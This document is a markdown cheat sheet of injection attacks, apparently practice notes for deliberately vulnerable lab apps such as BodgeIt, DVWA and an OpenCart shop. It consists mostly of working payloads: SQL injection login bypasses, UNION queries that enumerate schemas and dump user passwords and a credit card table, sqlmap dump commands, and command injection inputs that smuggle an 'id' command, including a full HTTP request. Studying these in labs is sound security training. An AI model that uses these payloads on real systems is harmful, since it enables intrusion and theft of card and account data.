# A1 - Injection


## SQL Injection

### Into string 
BodgeIt login

`' or 1=1);--`

`admin@thebodgeitstore.com' or '1'='1);--`

### String (low) and numeric (medium)

Examples on [DVWA](http://dvwa.lab/dvwa/vulnerabilities/sqli/)

```
1' or '1'='1
1' or 1=1#
1' union select null, version()#
1' union select null, concat(user(),0x0a,database())#
1' and 1=0 union select null, table_name from information_schema.tables#
1' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
1' and 1=0 union select null, concat(first_name,0x20,last_name,0x3a,user,0x3a,password) from users #
```

Examples on ["AwesomeShop"](http://awesome.lab/oc/)

Confirmation of SQLi

`http://awesome.lab/oc/index.php?route=information/information/info&information_id=-2490%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28IFNULL%28CAST%28VERSION%28%29%20AS%20CHAR%29%2C0x20%29%29%2CNULL%2CNULL%23`

enumerate columns count

`http://awesome.lab/oc/index.php?route=information/information/info&information_id=-2490%27%20order%20by%2010%23`

get db user, host, DBMS version, DB

`http://awesome.lab/oc/index.php?route=information/information/info&information_id=-2490%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28USER%28%29%2C0x20%2CDATABASE%28%29%2C0x20%2C@@VERSION%29%2CNULL%2CNULL%23`

get tables count to iterate

`http://awesome.lab/oc/index.php?route=information/information/info&information_id=-3444%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28COUNT%28*%29%29%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%28%27opencart%27%29%23`

get table names

`http://awesome.lab/oc/index.php?route=information/information/info&information_id=-3444%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28table_name%29%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%28%27opencart%27%29%20limit%200,1%23`
... LIMIT 2,1


get column names

`http://awesome.lab/oc/index.php?route=information/information/info&information_id=-3428' UNION ALL SELECT NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C(SELECT CONCAT(column_name,0x20,column_type) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='cc' AND table_schema='opencart' LIMIT 0,1)%2CNULL%2CNULL%2CNULL%23`
... LIMIT 2,1

dump the data

`http://awesome.lab/oc/index.php?route=information/information/info&information_id=-3428%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C%28SELECT%20CONCAT%28id,0x2c,CSC,type,0x2c,ccnum,0x2c,state,0x2c,expire_m,0x2c,expire_y,0x2c,last_name,0x2c,first_name%29%20FROM%20opencart.cc%20LIMIT%200,1%29%2CNULL%2CNULL%2CNULL%23`


Using sqlmap
```
sqlmap -b --dbms=mysql --batch -u 'http://awesome.lab/oc/index.php?route=information/information/info&information_id=3*'
sqlmap --current-db  --technique=U --dbms=mysql --batch -u 'http://awesome.lab/oc/index.php?route=information/information/info&information_id=3*'
sqlmap --schema -D 'opencart' --technique=U --dbms=mysql --batch -u 'http://awesome.lab/oc/index.php?route=information/information/info&information_id=3*'
sqlmap --dump -T 'cc' -D 'opencart' --technique=U --dbms=mysql --batch -u 'http://awesome.lab/oc/index.php?route=information/information/info&information_id=3*'
```

## Command injection

Try it on `http://dvwa.lab/dvwa/vulnerabilities/exec/`

```
127.0.0.1;id
127.0.0.1&id
x||id
```

```
POST /dvwa/vulnerabilities/exec/ HTTP/1.1
Host: dvwa.lab
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dvwa.lab/dvwa/vulnerabilities/exec/
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: close
Cookie: security=high; PHPSESSID=1mdh1pt8dt42taesnorvlh9og2
Upgrade-Insecure-Requests: 1

ip=127.0.0.1%0d%0Aid&Submit=Submit
```
